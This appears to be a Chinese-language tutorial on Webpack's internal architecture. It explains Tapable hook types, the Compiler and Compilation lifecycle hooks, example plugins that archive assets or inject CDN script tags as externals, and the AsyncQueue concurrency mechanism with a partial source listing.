的核心设计理念\nTapable：Webpack 底层使用了一个名为 Tapable 的库，这是 Webpack 的事件驱动机制的核心。Tapable 提供了钩子（Hooks）机制，类似于发布-订阅模式，可以在 Webpack 生命周期的各个关键节点上挂载事件，并触发事件。 生命周期钩子（Hooks）：Webpack 的整个打包过程被划分为多个阶段，每个阶段都有生命周期钩子（Hooks），如：compile、emit、done 等。插件可以在这些钩子上挂载自定义逻辑，扩展 Webpack 的功能。 插件系统（Plugins）：Webpack 的插件系统使得插件可以在打包过程中任何时刻“插入”定制化的功能。插件通过钩子与 Webpack 的事件流进行交互，从而修改、增强 Webpack 的行为。 Loader 机制：Webpack 中 loader 是专门处理模块转换的，loader 是作用于模块的，但和插件的设计理念相同，loader 也可以被认为是 webpack 插件系统的一部分。它们一起完成了对文件的转化和打包工作。 Webpack 底层架构设计的主要组件\nTapable 库 Webpack 中的 Tapable 是核心库，它类似于一个事件发布订阅系统，Webpack 的所有事件都是通过 Tapable 的 hooks 来管理。Tapable 提供了多种类型的 hooks，常用的如 SyncHook、AsyncSeriesHook、AsyncParallelHook，这些 hooks 控制着同步、异步的插件执行流程。\n1 2 3 4 5 6 7 8 9 10 const { SyncHook } = require(\u0026#34;tapable\u0026#34;); class MyPlugin { apply(compiler) { compiler.hooks.compile.tap(\u0026#34;MyPlugin\u0026#34;, (params) =\u0026gt; { console.log(\u0026#34;Compile is starting...\u0026#34;); }); } } // 这个例子展示了如何在 compile 钩子上注册一个同步钩子来执行自定义代码。 Webpack 生命周期和钩子 Webpack 的运行分为多个阶段，比如：\nInitialization：初始化 Webpack 配置文件、解析模块依赖 Compilation：递归处理模块依赖图，生成最终的代码包 Optimization：代码优化，如 Tree Shaking、代码压缩等 Emit：将打包好的资源输出到文件系统 每个阶段都有生命周期钩子，例如 beforeCompile、afterCompile、emit 等，开发者可以通过插件系统在这些生命周期中注册钩子，扩展功能。\nCompiler 和 Compilation Compiler 是 Webpack 的核心对象，负责启动 Webpack 的整个打包过程。所有插件通过 compiler 对象与 Webpack 进行交互。 Compilation 代表了 Webpack 打包过程中每一次构建的状态，包含了所有的模块、资源和生成代码的详细信息。插件可以通过 compilation 对象来访问和修改模块的具体打包结果。 Compiler 和 Compilation 的关系：\nCompiler 是全局的，它负责管理整个 Webpack 构建生命周期。 Compilation 是每次打包的上下文，它管理构建的细节（包括每个模块的依赖、处理、优化等）。 插件机制 Webpack 的插件机制通过 Compiler 和 Compilation 提供的钩子机制允许开发者在打包过程中“拦截”或“修改” Webpack 的行为。插件通过 apply 方法挂载到 compiler 上，并利用生命周期钩子执行自定义逻辑。\nLoader 系统 Loader 是用来转换模块的，比如将 .scss 转换为 .css，将 ES6+ 转换为 ES5。Loader 负责将不同类型的文件（如 CSS、图片等）转为 Webpack 可以理解的模块。 Loader 只作用于单个文件，而插件则可以作用于整个构建过程，Loader 可以组合使用形成链式处理，Loader 的顺序和插件的机制都可以通过 Webpack 配置灵活控制。 Webpack 插件系统的优势\n灵活性：通过插件，开发者可以非常轻松地扩展 Webpack 的功能，而不需要去修改 Webpack 核心代码。 强大的生命周期管理：Webpack 提供了众多的生命周期钩子，开发者可以在打包过程的任何时刻插入自己的逻辑，精细地控制打包过程。 插件生态丰富：Webpack 的插件生态非常丰富，从代码优化、文件压缩到模块热更新，Webpack 插件几乎覆盖了所有常见的需求。 事件驱动模型：Webpack 通过事件驱动的架构实现了高度的模块化和解耦，插件可以通过订阅不同的钩子来控制整个打包过程，这种设计带来了很高的可维护性和扩展性。 插件系统的实际应用场景\n代码压缩：通过插件在 emit 阶段将生成的文件进行压缩，例如 TerserPlugin。 代码分离：通过插件可以实现代码的按需加载或分离，SplitChunksPlugin 就是一个经典的分离代码的插件。 自动生成 HTML 文件：例如 HtmlWebpackPlugin 可以自动生成带有正确依赖的 HTML 文件。 热模块替换：通过 HotModuleReplacementPlugin 可以实现模块的热更新而不需要重新加载整个页面。 插件核心 tapable webpack 插件机制：\nwebpack 实现插件机制的大体方式是：\n创建 - webpack 在其内部对象上创建各种钩子；（如 compiler 对象上的 hooks 上的 run 或者 done） 注册 - 插件将自己的方法注册到对应钩子上，交给 webpack； 调用 - webpack 编译过程中，会适时地触发相应钩子，因此也就触发了插件的方法。 Webpack 本质上是一种事件流的机制，它的工作流程会将各个插件串联起来，而实现这一切的核心就是 Tapable，webpack 中最核心的负责编译的 Compiler 和负责创建 bundle 的 Compilation 都继承自 Tapable\n所以 webpack 中插件的勾子函数分布在 Compiler ，Compilation 等实例对象上，也就可以选择在这些对象的勾子上注册自己的插件。\n通过事件注册和监听，触发 webpack 生命周期中的函数方法\nwebpack 插件钩子（生命周期函数）可视化工具：wepback-plugin-visualizer\n1 2 3 4 5 6 7 8 9 10 11 const { SyncHook, SyncBailHook, SyncWaterfallHook, SyncLoopHook, AsyncParallelHook, AsyncParallelBailHook, AsyncSeriesHook, AsyncSeriesBailHook, AsyncSeriesWaterfallHook, } = require(\u0026#34;tapable\u0026#34;); tapable 分类 按同步异步分类 Hook 类型可以分为同步Sync和异步Async，异步又分为并行(一起开始，全部结束才结束)和串行（前一个结束后一个才开始）\n按返回值分类\nbasic：执行每一个事件函数，不关心函数的返回值，有 SyncHook、AsyncParallelHook、AsyncSeriesHook\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const { SyncHook } = require(\u0026#34;tapable\u0026#34;); const hook = new SyncHook([\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;]); // 形参数组，其中的元素的名字没有什么意义，重要的是这个数组的长度，他的长度会是下面回调函数接受到的实际参数的个数 // tap函数接受的第一个参数是表示回调的名字，其实也没有什么用 hook.tap(\u0026#34;1\u0026#34;, (name, age) =\u0026gt; { console.log(name, age); }); hook.tap(\u0026#34;2\u0026#34;, (name, age) =\u0026gt; { console.log(name, age); }); hook.tap(\u0026#34;3\u0026#34;, (name, age) =\u0026gt; { console.log(name, age); }); hook.call(\u0026#34;tom\u0026#34;, 18); waterfall：如果前一个事件函数的结果 result !== undefined，则 result 会作为后一个事件函数的第一个参数,有 SyncWaterfallHook，AsyncSeriesWaterfallHook\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const { SyncWaterfallHook } = require(\u0026#34;tapable\u0026#34;); /** * 形参数组 * 形参的名义没有意义 */ const hook = new SyncWaterfallHook([\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;]); /** * tap的第一个参数是回调函数的名称，但是这个名字只是给程序员看的 */ hook.tap(\u0026#34;1\u0026#34;, (name, age) =\u0026gt; { console.log(1, name, age); // \u0026#39;zhufeng\u0026#39;, 18 return \u0026#34;result1\u0026#34;; }); hook.tap(\u0026#34;2\u0026#34;, (name, age) =\u0026gt; { console.log(2, name, age); // \u0026#39;result1\u0026#39;, 18 return \u0026#34;result2\u0026#34;; }); hook.tap(\u0026#34;3\u0026#34;, (name, age) =\u0026gt; { console.log(3, name, age); // \u0026#39;result2\u0026#39;, 18 }); hook.call(\u0026#34;zhufeng\u0026#34;, 18); bail：执行每一个事件函数，遇到第一个钩子的返回值结果 result !== undefined ，则不再继续往后执行。有：SyncBailHook、AsyncSeriesBailHook, AsyncParallelBailHook\nloop：不停的循环执行事件函数，直到所有函数结果 result === undefined，有 SyncLoopHook 和 AsyncSeriesLoopHook\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 const { SyncLoopHook } = require(\u0026#34;tapable\u0026#34;); /** * 不停的执行回调函数，直到结果等于undefined */ const hook = new SyncLoopHook([\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;]); let counter1 = 0, counter2 = 0, counter3 = 0; hook.tap(\u0026#34;1\u0026#34;, (name, age) =\u0026gt; { console.log(1, \u0026#34;counter1\u0026#34;, counter1); if (++counter1 === 1) { counter1 = 0; return; } return true; }); hook.tap(\u0026#34;2\u0026#34;, (name, age) =\u0026gt; { console.log(2, \u0026#34;counter2\u0026#34;, counter2); if (++counter2 === 2) { counter2 = 0; return; } return true; }); hook.tap(\u0026#34;3\u0026#34;, (name, age) =\u0026gt; { console.log(3, \u0026#34;counter3\u0026#34;, counter3); if (++counter3 == 3) { counter3 = 0; return; } return true; }); hook.call(\u0026#34;zhufeng\u0026#34;, 18); 异步的 hook，注册方式有 3 种：\ntap：注册同步回调函数 tapAsync：注册异步回调函数，该函数接收的第三个参数是一个 callback 函数，调用这个 callback 函数表示该异步执行完成了 tapPromise：注册 promise 的回调函数，回调函数的返回值必须是 promise 实例 触发就没有 call，只有 callAsync、promise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 const { AsyncParallelHook } = require(\u0026#34;tapable\u0026#34;); const hook = new AsyncParallelHook([\u0026#34;name\u0026#34;, \u0026#34;age\u0026#34;]); //异步的hook，注册方式有3种 tap tapAsync tapPromise /* hook.tap(\u0026#39;1\u0026#39;, (name,age) =\u0026gt; { console.log(1, name, age); }); hook.tap(\u0026#39;2\u0026#39;, (name,age) =\u0026gt; { console.log(2, name, age); }); hook.tap(\u0026#39;3\u0026#39;, (name,age) =\u0026gt; { console.log(3,name,age); }); // 触发就没有call ，有callAsync promise hook.callAsync(\u0026#39;zhufeng\u0026#39;, 18, () =\u0026gt; { console.log(\u0026#39;done\u0026#39;); }); */ /* console.time(\u0026#39;cost\u0026#39;); hook.tapAsync(\u0026#39;1\u0026#39;, (name,age,callback) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(1, name, age); callback(); }, 1000); }); hook.tapAsync(\u0026#39;2\u0026#39;, (name,age,callback) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(2, name, age); callback(); }, 2000); }); hook.tapAsync(\u0026#39;3\u0026#39;, (name,age,callback) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(3, name, age); callback(); }, 3000); }); //触发就没有call，只有callAsync、promise hook.callAsync(\u0026#39;zhufeng\u0026#39;, 18, () =\u0026gt; { console.log(\u0026#39;done\u0026#39;); console.timeEnd(\u0026#39;cost\u0026#39;); }); */ console.time(\u0026#34;cost\u0026#34;); hook.tapPromise(\u0026#34;1\u0026#34;, (name, age) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(1, name, age); resolve(); }, 1000); }); }); hook.tapPromise(\u0026#34;2\u0026#34;, (name, age) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(2, name, age); resolve(); }, 2000); }); }); hook.tapPromise(\u0026#34;3\u0026#34;, (name, age) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { console.log(3, name, age); resolve(); }, 3000); }); }); hook.promise(\u0026#34;zhufeng\u0026#34;, 18).then(() =\u0026gt; { console.log(\u0026#34;done\u0026#34;); console.timeEnd(\u0026#34;cost\u0026#34;); }); tapable 原理 插件 在 webpack 的插件开发中，选择合适的 hook 类型对于实现插件的功能非常关键。不同的 hooks 允许插件在编译流程的不同阶段以不同的方式介入。以下是一些具体插件案例，展示了它们为什么会选择在相应的 hook 类型中注册函数：\nSyncHook 案例 - HtmlWebpackPlugin HtmlWebpackPlugin使用SyncHook来操纵生成的 HTML 文件。它在compilation的html-webpack-plugin-before-html-generation阶段注册一个同步的 hook，这允许它在 HTML 文件被生成之前修改 HTML 的内容。由于这个过程不需要异步操作，SyncHook就足够满足需求。\nSyncBailHook 案例 - MiniCssExtractPlugin MiniCssExtractPlugin可能会在normal-module-loader阶段使用SyncBailHook，这是因为它需要判断是否应该提取 CSS 到单独的文件。如果某个条件满足（例如，模块是 CSS 模块），它可以立即返回结果并阻止后续插件的执行，因此SyncBailHook适合这种场景。\nSyncWaterfallHook 案例 - DefinePlugin DefinePlugin使用SyncWaterfallHook在模块的源代码中替换全局变量。它在compilation的compilation阶段注册函数，允许它接收前一个插件处理的结果（源代码），然后添加或修改定义的全局变量，并将修改后的源代码传递给链中的下一个插件。\nAsyncParallelHook 案例 - CopyWebpackPlugin CopyWebpackPlugin需要将文件从一个位置复制到另一个位置，这个过程可以并行执行以提高效率。因此，它在emit阶段使用AsyncParallelHook，这样可以同时开始复制多个文件而不阻塞编译过程。\nAsyncSeriesHook 案例 - CleanWebpackPlugin CleanWebpackPlugin在编译开始之前需要清除output目录中的旧文件。这个过程应该在其他异步任务开始之前完成，因此它使用AsyncSeriesHook在compilation的emit阶段注册一个异步函数，确保清除操作完成后再执行后续操作。\nAsyncSeriesWaterfallHook 案例 - TerserWebpackPlugin TerserWebpackPlugin用于压缩 JavaScript 代码。它可能在optimize-chunk-assets阶段使用AsyncSeriesWaterfallHook，这样可以接收到前一个插件处理的代码（如果有的话），然后进行压缩操作，并将结果传递给链中的下一个插件。由于这个过程中每个插件的输出都可能成为下一个插件的输入，所以选择AsyncSeriesWaterfallHook是合适的。\n这些案例展示了不同 hooks 类型在实现 webpack 插件时的应用。选择正确的 hook 类型对于插件能够正确并高效地工作至关重要。通过这些 hooks，插件能够在编译流程的适当阶段以期望的方式执行操作，从而实现复杂的构建和优化任务。\n插件向第三方开发者提供了 webpack 引擎中完整的能力。使用阶段式的构建回调，开发者可以引入它们自己的行为到 webpack 构建流程中。webpack 内部也是通过大量内部插件实现的，插件几乎能够任意更改 webpack 编译结果。\n在 webpack 中，不同类型的实例对象很多，对象上的钩子也有很多。\nwebpack 内部可以加载插件的常用对象：\n对象 钩子 Compiler run,compile,compilation,make,emit,done\u0026hellip; Compilation buildModule,normalModuleLoader,succeedModule,finishModules,seal,optimize,after-seal\u0026hellip; Module Factory beforeResolver,afterResolver,module,parser\u0026hellip; Module Parser program,statement,call,expression\u0026hellip; Template hash,bootstrap,localVars,render\u0026hellip; Compiler(编译器对象)\nrun：开启编译 compile：开始编译 compilation：开始创建一次新的编译 make：构建入口 emit：准备输出结果 done：完成编译，是一个 asyncSeriesHook Compilation（编译器对象），每当开启一次新的编译就创建一个新的 compilation\nbuildModule：构建模块 normalModuleLoader：加载普通模块 succeedModule：成功编译一个模块 finishModules：所有模块都编译完成 seal：封装代码块 optimize：优化 after-seal：封装完成 Module Factory （模块工厂）\nbeforeResolver：解析之前（解析：拿到对应模块的需要被那些 loader 处理的 loader 文件的路径和该模块资源本身） afterResolver：解析后（解析：拿到对应模块的需要被那些 loader 处理的 loader 文件的路径和该模块资源本身） module：创建模块 parser：通过语法树解析模块依赖 Parser （解析语法树）\n遍历语法树时遇到下面这些节点就触发这些节点名函数\nprogram statement call expression Template，根据模板生成最后的源代码\nhash bootstrap localVars render 创建插件\n插件是一个类 类上有一个 apply 的实例方法 apply 的参数是 compiler 1 2 3 4 5 6 7 8 9 class DonePlugin { constructor(options) { this.options = options; } apply(compiler) { // ... } } module.exports = DonePlugin; 在插件开发中最重要的两个资源就是compiler和compilation对象。\ncompiler 对象代表了完整的 webpack 环境配置。这个对象在启动 webpack 时被一次性建立，并配置好所有可操作的设置，包括 options，loader 和 plugin。当在 webpack 环境中应用一个插件时，插件将收到此 compiler 对象的引用。可以使用它来访问 webpack 的主环境。 compilation 对象代表了一次资源版本构建。当运行 webpack 开发环境中间件时，每当检测到一个文件变化，就会创建一个新的 compilation，从而生成一组新的编译资源。一个 compilation 对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息。compilation 对象也提供了很多关键时机的回调，以供插件做自定义处理时选择使用。 compiler 上的插件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class DonePlugin { apply(compiler) { // 同步回调 compiler.hooks.done.tap(\u0026#34;DonePlugin\u0026#34;, (stats) =\u0026gt; { console.log(\u0026#34;DonePlugin.tap\u0026#34;); }); // 异步回调 compiler.hooks.done.tapAsync(\u0026#34;DonePlugin\u0026#34;, (stats, callback) =\u0026gt; { console.log(\u0026#34;DonePlugin.tapAsync\u0026#34;); callback(null); }); } } module.exports = DonePlugin; compilation 上的插件：\n要获取 compilation 实例的话，需要通过 compiler.hooks.compilation 这个 hook 来获取，订阅这个 hook 后，该订阅函数的回调参数就是接收 webpack 内部传递的 compilation 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /** * 在编译完成后，希望把dist目录下所有的文件打在一个压缩包，保存到输出目录里 */ const jszip = require(\u0026#34;jszip\u0026#34;); const { RawSource } = require(\u0026#34;webpack-sources\u0026#34;); class ArchivePlugin { apply(compiler) { compiler.hooks.compilation.tap(\u0026#34;ArchivePlugin\u0026#34;, (compilation) =\u0026gt; { compilation.hooks.processAssets.tapAsync( { name: \u0026#34;ArchivePlugin\u0026#34; }, (assets) =\u0026gt; { const zip = new jszip(); for (const pathname in assets) { const source = assets[pathname]; const sourceCode = source.source(); //返回源代码字符串 zip.file(pathname, sourceCode); } return zip.generateAsync({ type: \u0026#34;nodebuffer\u0026#34; }).then((content) =\u0026gt; { assets[`${Date.now()}.zip`] = new RawSource(content); /* assets[`${Date.now()}.zip`] = { source() { return content; } } */ }); } ); }); } } module.exports = ArchivePlugin; 自动外联插件 ExternalsPlugin.js ExternalModuleFactoryPlugin ExternalModule.js parser factory htmlWebpackPluginAlterAssetTags 传统在 wabpack 中配置 cdn，一般在项目中引入一些著名的公共库的话，如果不做任何处理，该公共库的源代码会被一并打包到最终生成的文件中，增加打包文件的体积。 为了解决这个问题，可以通过 cdn 来解决，一般步骤如下：\n在 html-webpack-plugin 插件的模板 html 中添加 cdn 外链脚本，他们会在全局 window 对象上挂载属性，比如 vue，_，$等，自己必须知道这个变量名字才行\n在 webpakc 配置中的 externals 选项中配置需要排除的依赖库，如：\n1 2 3 4 5 6 7 { \u0026#34;externals\u0026#34;:{ \u0026#39;jquery\u0026#39;:\u0026#39;$\u0026#39;, // 当项目中引入jquery后，引入的jquery对应的变量名字不再去node_modules中找了，直接去window.$上找 \u0026#39;lodash\u0026#39;:\u0026#39;_\u0026#39;， \u0026#39;vue\u0026#39;:\u0026#39;vue\u0026#39; } } 现在自己来写一个插件将上面的两步通过插件来实现。\n使用插件如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 { plugins:[ new AutoExternalPlugin({ jquery:{ url:\u0026#39;http://xxx.cdn/xxx/xxx.js\u0026#39;, variable:\u0026#39;$\u0026#39; }, { // .... } }) ] } 该插件除了要识别源码内部是否引入需要被排除打包的库，还需要和使用 html-webpack-plugin 生成的 html 模板内容进行交互。\n检测依赖 当检测到有import或者require该指定的library时，将其设置为不打包类似exteral,并在指定模版中加入 script,那么如何检测某个模块中通过 import 或者 require 方法引入了需要排除的模块了？这里就用Parser external依赖 需要了解 external 是如何实现的，webpack 的 external 是通过插件ExternalsPlugin实现的，ExternalsPlugin 通过tap NormalModuleFactory 在每次创建 Module 的时候判断是否是ExternalModule，如果是则创建外部模块，如果不是则创建普通模块，所以就用到了 AsyncSeriesBailHookss webpack4 加入了模块类型之后，Parser获取需要指定类型 moduleType,一般使用javascript/auto即可 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 const { ExternalModule } = require(\u0026#34;webpack\u0026#34;); const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); class AutoExternalPlugin { constructor(options) { this.options = options; this.externalModules = Object.keys(options); this.importedModules = new Set(); } apply(compiler) { //获取到普通模块工厂,此工厂在Compiler创建的时候就直接创建好了。 //饭店=Compiler 招聘一个厨师 normalModuleFactory //每当接到订单，顾客点个蛋炒饭，或者说创建一个模块，会由厨师normalModuleFactory创建这个模块 compiler.hooks.normalModuleFactory.tap( \u0026#34;AutoExternalPlugin\u0026#34;, (normalModuleFactory) =\u0026gt; { //模块工厂会负责创建模块，创建完模块要编译模块，就是把模块源码转成语法树AST，然后遍历语法树找依赖 //在遍历语法树的时候，遇到不同的点节会触发不同的事件 normalModuleFactory.hooks.parser .for(\u0026#34;javascript/auto\u0026#34;) .tap(\u0026#34;AutoExternalPlugin\u0026#34;, (parser) =\u0026gt; { parser.hooks.import.tap( \u0026#34;AutoExternalPlugin\u0026#34;, (statement, source) =\u0026gt; { if (this.externalModules.includes(source)) this.importedModules.add(source); } ); //call是一个hookMap {key:Hook} 判断call这个hookMap里有没有require这个key对应的hook,如果有返回，没有则创建再返回 parser.hooks.call .for(\u0026#34;require\u0026#34;) .tap(\u0026#34;AutoExternalPlugin\u0026#34;, (expression) =\u0026gt; { const source = expression.arguments[0].value; if (this.externalModules.includes(source)) this.importedModules.add(source); }); }); //2.改造模块的生产过程，拦截生成过程，判断如果是外部模块的话，生产一个外部模块并返回 normalModuleFactory.hooks.factorize.tapAsync( \u0026#34;AutoExternalPlugin\u0026#34;, (resolveData, callback) =\u0026gt; { const { request } = resolveData; //获取加载的模块名 request = jquery //如果这个要创建的模块是外部模块的话 if (this.externalModules.includes(request)) { let { variable } = this.options[request]; // ExternalModule就是原生的external配置项在源码中使用到的工具类 callback(null, new ExternalModule(variable, \u0026#34;window\u0026#34;, request)); } else { callback(null); } } ); } ); //3.向产出的html里插入CDN的脚本 compiler.hooks.compilation.tap(\u0026#34;AutoExternalPlugin\u0026#34;, (compilation) =\u0026gt; { HtmlWebpackPlugin.getHooks(compilation).alterAssetTags.tapAsync( \u0026#34;AutoExternalPlugin\u0026#34;, (data, callback) =\u0026gt; { const { assetTags } = data; for (let key of this.importedModules) { assetTags.scripts.unshift({ tagName: \u0026#34;script\u0026#34;, voidTag: false, attributes: { defer: false, src: this.options[key].url, }, }); } console.log(assetTags); callback(null, data); } ); }); } } module.exports = AutoExternalPlugin; /** * 实现思路 * 1.找到本项目中的所有依赖的模块，看看哪些在AutoExternalPlugin配置了 * 也就是说看看项目里有没有使用jquery和lodash * 因为用到了才需要处理为外部模块，如果没有用过就不需要任何处理 * 2.如何找本项目依赖了哪些模块? * import \u0026#39;lodash\u0026#39; * require(\u0026#39;query\u0026#39;); callExpression * 所以我要找项目中的import和require语句，或者说节点 * Compiler=\u0026gt;NormalModuleFactory=\u0026gt;Parser=\u0026gt;import/require */ /** * HtmlWebpackPlugin核心功能 * 1.编译HTML模板 * 2.根据webpack传递过来的资源信息assets,生成标签.js=\u0026gt;script,css=\u0026gt;link * 3.把标签注入HTML文件中 * 4.写入硬盘 emit就是指写入硬盘 */ html-webpack-plugin 该插件会向 compilation 上挂载一些额外的 hook 实例。\nAsyncQueue 异步队列。通过它可以实现并行执行任务。\n在 Webpack 中，AsyncQueue 是一个用于处理异步任务的内部机制。它管理和调度异步操作，并确保这些操作在合适的时机执行。Webpack 需要在构建流程中处理大量的异步任务（如模块解析、文件读取、插件操作等），而 AsyncQueue 通过一种队列机制，帮助管理这些任务，确保它们按照一定顺序执行，并避免重复操作。\nAsyncQueue 的核心概念\nAsyncQueue 实质上是一个任务队列系统，它的主要作用是：\n缓存任务结果：对已经处理过的任务进行缓存，避免重复执行。 任务去重：同一个任务在未完成之前，只允许被执行一次，后续相同的任务会被缓存起来，等任务完成后统一处理。 任务并发管理：控制任务的并发执行，确保在合适的时机调度任务，避免资源耗尽或不必要的并发操作。 AsyncQueue 的使用场景\n模块解析： Webpack 在解析依赖模块时，使用 AsyncQueue 来管理模块解析任务。当某个模块正在被解析时，其他依赖于该模块的任务将被暂时挂起，直到该模块解析完成。 文件处理： 在构建过程中，Webpack 需要读取和处理多个文件（如 JS 文件、CSS 文件等）。这些文件的读取往往是异步的。通过 AsyncQueue，Webpack 可以有效地管理这些文件读取操作，避免重复读取，并确保在文件读取完毕后再执行后续操作。 插件系统： Webpack 插件在执行过程中可能会涉及大量异步操作，例如压缩文件、输出文件等。AsyncQueue 帮助插件系统管理这些异步任务，使得插件之间能够有效协同工作。 AsyncQueue 的核心方法和工作流程\nenqueue：将任务放入队列中等待执行。 每个任务在被放入队列后会被立即执行，或在前置任务完成后执行。 process：处理任务，并将任务的结果缓存，避免重复执行。 处理任务时，若发现任务已经存在缓存，会直接返回缓存结果，而不会重新执行。 resolve：当任务完成时，通知队列该任务已经处理完毕，并唤醒后续依赖该任务的任务。 AsyncQueue 的工作流程\n任务入队：当 Webpack 需要执行某个异步操作（如模块解析）时，首先检查该任务是否已经存在缓存，若不存在则将任务放入队列。 任务执行：队列按照一定顺序执行任务，并记录每个任务的执行结果。若某个任务依赖其他任务，则会等待依赖任务完成后再执行。 任务缓存：一旦任务执行完成，结果会被缓存起来，后续相同的任务不会重复执行，而是直接返回缓存结果。 任务完成：当所有任务完成后，Webpack 继续后续的构建流程。 AsyncQueue 的实际应用场景\n模块解析与文件读取：Webpack 需要异步加载模块和读取文件内容，AsyncQueue 能确保每个模块或文件只被解析一次，避免重复解析和读取，提升构建性能。 多任务调度：Webpack 插件系统中，多个插件之间的任务调度可能存在依赖，AsyncQueue 能够帮助管理这些复杂的任务依赖和执行顺序。 总结 AsyncQueue 是 Webpack 内部的一个异步任务队列机制，它帮助管理和调度异步任务，避免重复执行，提升构建的效率。它的主要使用场景包括模块解析、文件处理和插件执行，通过它的队列机制，Webpack 能有效管理复杂的异步操作，确保任务的正确执行顺序和资源的高效利用。\n采用缓存，懒编译和并行编译等方式提升编译速度。而 AsyncQueue 是 webpack5 中新增加的优化机制。AsyncQueue 可以实现并行执行指定数量的异步任务。内部对任务进行并发的控制或者说管理。\n给你一系列的异步任务，要求写一个管理器去并发控制他们的执行，同时能指定并发的数量。\n使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 //webpack 缓存 懒编译 并行编译 //AsyncQueue 可以实现并行执行任务 //任务的并发控制或者说管理工具 AsyncQueue const AsyncQueue = require(\u0026#34;webpack/lib/util/AsyncQueue\u0026#34;); function processor(module, callback) { //异步是模拟异步创建模块的过程 setTimeout(() =\u0026gt; { console.log(\u0026#34;process \u0026#34;, module); callback(null, { ...module, content: module.key + \u0026#34;内容\u0026#34; }); }, 3000); } const getKey = (module) =\u0026gt; module.key; let queue = new AsyncQueue({ name: \u0026#34;createModule\u0026#34;, // 队列的名字 parallelism: 3, // 允许的并发数量 processor, // 处理模块的方法 getKey, // 通过这个方法获取每个任务唯一标识 }); const start = Date.now(); // 向队列中添加任务 queue.add({ key: \u0026#34;module1\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); queue.add({ key: \u0026#34;module2\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); queue.add({ key: \u0026#34;module3\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); queue.add({ key: \u0026#34;module4\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); queue.add({ key: \u0026#34;module5\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); queue.add({ key: \u0026#34;module1\u0026#34; }, (err, createdModule) =\u0026gt; { console.log(createdModule); console.log((Date.now() - start) / 1000); }); 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 const QUEUED_STATE = 0; //已经 入队，待执行 const PROCESSING_STATE = 1; //处理中 const DONE_STATE = 2; //处理完成 class ArrayQueue { constructor() { this._list = []; } enqueue(item) { this._list.push(item); //[1,2,3] } dequeue() { return this._list.shift(); //移除并返回数组中的第一个元素 } } class AsyncQueueEntry { constructor(item, callback) { this.item = item; //任务的描述 this.state = QUEUED_STATE; //这个条目当前的状态 this.callback = callback; //任务完成的回调 } } class AsyncQueue { constructor({ name, parallelism, processor, getKey }) { this._name = name; //队列的名字 this._parallelism = parallelism; //并发执行的任务数 this._processor = processor; //针对队列中的每个条目执行什么操作 this._getKey = getKey; //函数，返回一个key用来唯一标识每个元素 this._entries = new Map(); this._queued = new ArrayQueue(); //将要执行的任务数组队列 this._activeTasks = 0; //当前正在执行的数，默认值1 this._willEnsureProcessing = false; //是否将要开始处理 } add = (item, callback) =\u0026gt; { const key = this._getKey(item); //获取这个条目对应的key const entry = this._entries.get(key); //获取 这个key对应的老的条目 if (entry !== undefined) { if (entry.state === DONE_STATE) { process.nextTick(() =\u0026gt; callback(entry.error, entry.result)); } else if (entry.callbacks === undefined) { entry.callbacks = [callback]; } else { entry.callbacks.push(callback); } return; } const newEntry = new AsyncQueueEntry(item, callback); //创建一个新的条目 this._entries.set(key, newEntry); //放到_entries this._queued.enqueue(newEntry); //把这个新条目放放队列 if (this._willEnsureProcessing === false) { this._willEnsureProcessing = true; setImmediate(this._ensureProcessing); } }; _ensureProcessing = () =\u0026gt; { //如果当前的激活的或者 说正在执行任务数行小于并发数 while (this._activeTasks \u0026lt; this._parallelism) { const entry = this._queued.dequeue(); //出队 先入先出 if (entry === undefined) break; this._activeTasks++; //先让正在执行的任务数++ entry.state = PROCESSING_STATE; //条目的状态设置为执行中 this._startProcessing(entry); } this._willEnsureProcessing = false; }; 